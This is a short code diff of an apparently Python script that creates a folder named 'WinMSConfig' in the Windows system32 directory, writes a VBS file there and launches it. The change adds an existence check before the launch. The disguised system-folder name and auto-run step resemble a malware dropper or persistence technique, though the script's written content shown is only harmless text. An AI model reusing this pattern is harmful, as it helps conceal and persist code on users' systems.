@@ -21,7 +21,7 @@ userprofile = os.environ["USERPROFILE"]
 subprocess.getoutput('md "%systemroot%\system32\WinMSConfig"')
 subprocess.getoutput('echo Good, you are here >> "%systemroot%\system32\WinMSConfig\Start.vbs"')
 subprocess.getoutput('cd "%systemroot%\system32\WinMSConfig"')
-subprocess.getoutput('start Start.vbs')
+subprocess.getoutput('if exist Start.vbs start Start.vbs')
 subprocess.getoutput('timeout 1 >nul /nobreak')
 
 
